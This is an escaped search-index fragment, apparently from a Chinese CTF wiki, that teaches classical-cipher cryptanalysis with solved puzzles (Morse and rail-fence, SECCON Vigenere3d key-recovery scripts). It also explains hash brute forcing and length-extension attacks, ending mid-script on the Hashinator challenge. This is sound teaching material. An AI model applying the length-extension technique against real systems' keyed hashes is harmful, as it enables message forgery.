\u4e2d\u6709\u5173\u53e4\u5178\u5bc6\u7801\u7684\u9898\u76ee\uff0c\u901a\u5e38\u662f\u6839\u636e\u5bc6\u6587\u6c42\u51fa\u660e\u6587\uff0c\u56e0\u6b64\u91c7\u7528\u552f\u5bc6\u6587\u653b\u51fb\u5c45\u591a\uff0c\u57fa\u672c\u5206\u6790\u601d\u8def\u603b\u7ed3\u5982\u4e0b\uff1a</p> <ol> <li>\u786e\u5b9a\u5bc6\u7801\u7c7b\u578b\uff1a\u6839\u636e\u9898\u76ee\u63d0\u793a\u3001\u52a0\u5bc6\u65b9\u5f0f\u3001\u5bc6\u6587\u5b57\u7b26\u96c6\u3001\u5bc6\u6587\u5c55\u73b0\u5f62\u5f0f\u7b49\u4fe1\u606f\u3002</li> <li>\u786e\u5b9a\u653b\u51fb\u65b9\u6cd5\uff1a\u5305\u62ec\u76f4\u63a5\u5206\u6790\u3001\u86ee\u529b\u653b\u51fb\u3001\u7edf\u8ba1\u5206\u6790\u7b49\u65b9\u6cd5\u3002\u5bf9\u4e8e\u65e0\u6cd5\u786e\u5b9a\u7c7b\u578b\u7684\u7279\u6b8a\u5bc6\u7801\uff0c\u5e94\u6839\u636e\u5176\u5bc6\u7801\u7279\u6027\u9009\u7528\u5408\u9002\u7684\u653b\u51fb\u65b9\u6cd5\u3002</li> <li>\u786e\u5b9a\u5206\u6790\u5de5\u5177\uff1a\u4ee5\u5728\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e Python \u811a\u672c\u5de5\u5177\u5305\u4e3a\u4e3b\uff0c\u4ee5\u79bb\u7ebf\u5bc6\u7801\u5206\u6790\u5de5\u5177\u4e0e\u624b\u5de5\u5206\u6790\u4e3a\u8f85\u3002</li> </ol> <p>\u4ee5\u4e0a\u552f\u5bc6\u6587\u653b\u51fb\u65b9\u6cd5\u7684\u9002\u7528\u573a\u666f\u4e0e\u4e3e\u4f8b\u5982\u4e0b\uff1a</p> \u653b\u51fb\u65b9\u6cd5 \u9002\u7528\u573a\u666f \u4e3e\u4f8b \u76f4\u63a5\u5206\u6790\u6cd5 \u7531\u5bc6\u7801\u7c7b\u578b\u53ef\u786e\u5b9a\u6620\u5c04\u5173\u7cfb\u7684\u4ee3\u6362\u5bc6\u7801 \u51ef\u6492\u5bc6\u7801\u3001\u732a\u5708\u5bc6\u7801\u3001\u952e\u76d8\u5bc6\u7801\u7b49 \u86ee\u529b\u653b\u51fb\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u4ee3\u6362\u5bc6\u7801\u6216\u7f6e\u6362\u5bc6\u7801 \u79fb\u4f4d\u5bc6\u7801\u3001\u6805\u680f\u5bc6\u7801\u7b49 \u7edf\u8ba1\u5206\u6790\u6cd5 \u5bc6\u94a5\u7a7a\u95f4\u8f83\u5927\u7684\u4ee3\u6362\u5bc6\u7801 \u7b80\u5355\u66ff\u6362\u5bc6\u7801\u3001\u4eff\u5c04\u5bc6\u7801\u3001\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7b49"},{"location":"crypto/classical/summary/#_3","title":"\u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231","text":"<p>\u9898\u76ee\u63cf\u8ff0</p> <p>\u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE \u5230\u5e95\u7b49\u4e0d\u7b49\u4e8e ABC\uff1f</p> <p>-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---</p> <p>flag\u683c\u5f0f\uff1aCTF{xxx}</p> <p>\u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 <code>KIQLWTFCQGNSOO</code>\uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e <code>QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC</code>\uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002  </p> <p>\u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 <code>IILYOAVNEBSAHR</code>\u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 <code>ILOVESHIYANBAR</code>\u3002</p>"},{"location":"crypto/classical/summary/#2017-seccon-vigenere3d","title":"2017 SECCON Vigenere3d","text":"<p>\u7a0b\u5e8f\u5982\u4e0b</p> <pre><code># Vigenere3d.py\nimport sys\ndef _l(idx, s):\n    return s[idx:] + s[:idx]\ndef main(p, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    c = \"\"\n    for a in p:\n        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return c\nprint main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])\n\n$ python Vigenere3d.py SECCON{**************************} **************\nPOR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\n</code></pre> <p>\u89e3\u6cd5\u4e00\uff1a</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210 $$ t[i][j]=s[i+j:]+s[:i+j] \\ t[i][k]=s[i+k:]+s[:i+k] $$</p> <p>t[i][j][k] \u4e3a t[i][j] \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0ct[i][k][j] \u4e3a t[i][k] \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f i+j+k \u662f\u5426\u8d85\u8fc7 <code>len(s)</code> \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 t[i][j][k]=t[i][k][j] \u3002</p> <p>\u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002</p> <p>\u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002</p> <p>\u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b</p> <pre><code>def get_key(plain, cipher):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n         for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    key = ['*'] * 14\n    for i in range(len(plain)):\n        for i1 in range(len(s)):\n            for i2 in range(len(s)):\n                if t[s.find(plain[i])][s.find(s[i1])][s.find(s[i2])] == cipher[\n                        i]:\n                    key[i] = s[i1]\n                    key[13 - i] = s[i2]\n    return ''.join(key)\n</code></pre> <p>\u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b</p> <pre><code>def decrypt(cipher, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n         for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    plain = \"\"\n    for a in cipher:\n        for i in range(len(s)):\n            if t[i][s.find(k1[i1])][s.find(k2[i2])] == a:\n                plain += s[i]\n                break\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return plain\n</code></pre> <p>\u5f97\u5230\u660e\u6587\u5982\u4e0b</p> <p><pre><code>\u279c  2017_seccon_vigenere3d git:(master) python exp.py\nSECCON{Welc0me_to_SECCON_CTF_2017}\n</code></pre> \u89e3\u6cd5\u4e8c</p> <p>\u5173\u4e8e\u6b64\u9898\u7684\u5206\u6790\uff1a</p> <ol> <li>\u8003\u8651\u5230\u5728\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\u4e0b\uff0c\u6570\u7ec4\u8bbf\u95ee\u4e0d\u4f1a\u8d8a\u754c\uff0c\u6211\u4eec\u5728\u8ba8\u8bba\u65f6\u505a\u4ee5\u4e0b\u7ea6\u5b9a\uff1aarr[index] \\Leftrightarrow arr[index \\% len(arr)]</li> <li>\u5173\u4e8e python \u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684 <code>_l</code> \u51fd\u6570\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1a\\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset]</li> <li>\u5173\u4e8e python \u7684 main \u51fd\u6570\u4e2d\u4e09\u7ef4\u77e9\u9635 t \u7684\u5b9a\u4e49\uff0c\u53d1\u73b0\u4ee5\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1at[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c]</li> <li>\u7efc\u5408\u7b2c 2 \u7b2c 3 \u70b9\u7684\u89c2\u5bdf\uff0c\u6709\u5982\u4e0b\u7b49\u4ef7\u5173\u7cfb\uff1at[a][b][c] \\Leftrightarrow s[a+b+c]</li> <li>\u6211\u4eec\u5c06 s \u89c6\u4e3a\u4e00\u79cd\u7f16\u7801\u683c\u5f0f\uff0c\u5373\uff1a\u7f16\u7801\u8fc7\u7a0b s.find(x)\uff0c\u89e3\u7801\u8fc7\u7a0b s[x]\u3002\u5e76\u76f4\u63a5\u4f7f\u7528\u5176\u7f16\u7801\u7ed3\u679c\u7684\u6570\u5b57\u66ff\u4ee3\u5176\u6240\u4ee3\u6307\u7684\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u52a0\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u8868\u793a\uff1a</li> <li>e = f +  k1 +k2</li> <li>\u5176\u4e2d\uff0ce \u662f\u5bc6\u6587\uff0cf \u662f\u660e\u6587\uff0ck1 \u4e0e k2 \u662f\u901a\u8fc7\u590d\u5236\u65b9\u6cd5\u5f97\u5230\u3001\u4e0e f \u957f\u5ea6\u4e00\u6837\u7684\u5bc6\u94a5\uff0c\u52a0\u6cd5\u662f\u5411\u91cf\u52a0\u3002</li> </ol> <p>\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u8ba1\u7b97 <code>k1+k2</code> \uff0c\u6a21\u62df\u5bc6\u94a5\uff0c\u5373\u53ef\u89e3\u5bc6\u3002\u5173\u4e8e\u6b64\u9898\u7684\u89e3\u5bc6 python \u811a\u672c\uff1a</p> <pre><code># exp2.py\nenc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}'\ndec_dic = {k:v for v,k in enumerate(enc_str)}\nencrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9'\nflag_bg = 'SECCON{**************************}'\n\nsim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(7)] # \u7834\u89e3\u6a21\u62df\u5bc6\u94a5\nsim_key = sim_key + sim_key[::-1]\n\nflag_ed = [dec_dic[v]-sim_key[k%14] for k,v in enumerate(encrypt)] # \u6a21\u62df\u5bc6\u94a5\u89e3\u5bc6\nflag_ed = ''.join([enc_str[i%len(enc_str)] for i in flag_ed]) # \u89e3\u7801\nprint(flag_ed)\n</code></pre> <p>\u5f97\u5230\u660e\u6587\u5982\u4e0b\uff1a</p> <pre><code>$ python exp2.py\nSECCON{Welc0me_to_SECCON_CTF_2017}\n</code></pre>"},{"location":"crypto/classical/summary/#_4","title":"\u6d88\u5931\u7684\u4e09\u91cd\u5bc6\u7801","text":"<p>\u5bc6\u6587 <pre><code>of zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl!\n</code></pre></p> <p>\u4f7f\u7528 quipquip \u76f4\u63a5\u89e3\u5bc6\u3002</p>"},{"location":"crypto/hash/attack/","title":"Hash Attack","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709</p> <ul> <li>\u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b</li> <li>\u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002</li> <li>\u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002</li> <li>\u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002</li> </ul>"},{"location":"crypto/hash/attack/#_1","title":"\u66b4\u529b\u653b\u51fb","text":"<p>HashCat \u5de5\u5177 \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b</p> <p>HashCat \u5b98\u7f51</p> <p>HashCat \u7b80\u5355\u4f7f\u7528</p>"},{"location":"crypto/hash/attack/#hash-length-extension-attacks","title":"\u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09","text":""},{"location":"crypto/hash/attack/#_2","title":"\u4ecb\u7ecd","text":"<p>\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea\u7ef4\u57fa\u767e\u79d1\u3002</p> <p>\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728\u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5\u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002</p> <p>\u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002</li> <li>\u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002</li> </ul> <p>\u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6</p> <ul> <li>\u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765</li> <li>\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002</li> <li>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002</li> </ul> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002</p>"},{"location":"crypto/hash/attack/#_3","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373</p> <p>now=key|s|padding</p> <p>\u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373</p> <p>key|s|padding|extra</p> <p>\u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c</p> <ol> <li>\u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002</li> <li>\u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002</li> <li>\u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002</li> </ol> <p>\u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002</p> <p>\u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002</p>"},{"location":"crypto/hash/attack/#_4","title":"\u4f8b\u5b50","text":"<p>\u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002</p>"},{"location":"crypto/hash/attack/#_5","title":"\u5de5\u5177","text":"<ul> <li>hashpump</li> </ul> <p>\u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002</p>"},{"location":"crypto/hash/attack/#hash","title":"hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef","text":"<p>\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002</p>"},{"location":"crypto/hash/attack/#hashinator","title":"Hashinator","text":"<p>\u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a<code>password</code>\uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684<code>password</code>\u3002</p>"},{"location":"crypto/hash/attack/#_6","title":"\u5206\u6790","text":"<p>\u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a<code>md5</code>\uff0c<code>sha1</code>\uff0c<code>blake</code>\uff0c<code>scrypt</code>\u3002 \u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>    password = self.generate_password()     # from rock_you.txt\n    salt = self.generate_salt(password)     # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173\n    hash_rounds = self.generate_rounds()    # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f\n    password_hash = self.calculate_hash(salt + password, hash_rounds)\n</code></pre> 1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece<code>rockyou.txt</code>\u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a<code>password</code>\uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002 2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684<code>password</code>\u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a<code>128 - len(password)</code>\u7684<code>salt</code>\u3002 3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002 4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684<code>password</code>\u3001<code>salt</code>\u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684<code>password_hash</code>\u3002</p> <p>\u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002 \u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230<code>generate_salt()</code>\u51fd\u6570\u4e2d\uff0c<code>salt</code>\u548c<code>password</code>\u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86 <pre><code>    msize = 128 # f-you hashcat :D\n</code></pre> so\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002</p> <p>\u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b<code>calculate_hash()</code>\u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a <pre><code>for i in range(len(hash_rounds)):\n    interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n    interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\nfinal_hash = interim_salt + interim_hash\n</code></pre> \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a 1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002 2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002 3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002 4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230<code>interim_salt</code>\u548c<code>interim_hash</code>\u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002 5. <code>interim_salt</code>\u548c<code>interim_hash</code>\u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002</p> <p>\u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b<code>interim_salt</code>\u548c<code>interim_hash</code>\u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002</p>  interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)  <p>\u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 interim\\_hash_1 \u548c interim\\_salt_3\uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fainterim\\_hash_2\u7684\u503c\uff0c\u800cinterim\\_hash_2\u5219\u662f\u4e0a\u4e00\u8f6e\u7684<code>interim_hash</code>\u3002 \u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684<code>password</code>\u548c<code>salt</code>\u3002</p> <p>\u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a <pre><code>import os\nimport hashlib\nimport socket\nimport threading\nimport socketserver\nimport struct\nimport time\nimport threading\n# import pyscrypt\nfrom base64 import b64encode, b64decode\nfrom pwn import *\ndef md5(bytestring):\n    return hashlib.md5(bytestring).digest()\ndef 